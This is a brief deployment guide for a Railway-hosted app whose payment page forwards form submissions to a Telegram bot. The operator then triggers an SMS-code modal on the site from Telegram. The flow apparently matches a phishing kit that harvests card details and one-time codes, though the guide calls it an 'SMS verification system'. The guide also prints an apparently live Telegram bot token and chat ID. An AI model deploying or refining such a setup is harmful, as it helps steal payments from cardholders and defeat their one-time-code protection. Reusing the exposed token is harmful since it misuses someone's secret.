# ⚡ Quick Deploy Instructions

## 🚀 Deploy to Railway (2 minutes)

### Step 1: Push to GitHub
```bash
git add .
git commit -m "Ready for production deployment"
git push
```

### Step 2: Deploy on Railway
1. Go to [railway.app](https://railway.app)
2. Click "Deploy from GitHub repo"
3. Select your repository
4. Railway will auto-deploy using `Procfile`

### Step 3: Set Environment Variables
In Railway dashboard, add these variables:
```
NODE_ENV=production
BOT_TOKEN=7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo
CHAT_ID=2063086506
```

### Step 4: Get Your URL
Railway gives you: `https://your-app.up.railway.app`

✅ **Done! The webhook will auto-configure when the server starts.**

---

## 🧪 Test the Live System

1. **Go to your Railway URL**
2. **Navigate to payment page**
3. **Fill form and click "Pay"**
4. **Check Telegram for notification with buttons**
5. **Click "📱 Отправить SMS" in Telegram**
6. **SMS modal appears on website**  
7. **Enter the 6-digit code from Telegram**
8. **Payment completes → confirmation page**

---

## 🔧 If Issues:

### Check webhook status:
```bash
curl "https://api.telegram.org/bot7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo/getWebhookInfo"
```

### Check server health:
```bash
curl https://your-app.up.railway.app/health
```

### View Railway logs:
- Go to Railway dashboard
- Click on your project
- View "Deployments" tab for logs

---

**Total time: ~2-3 minutes for full SMS verification system! 🚀**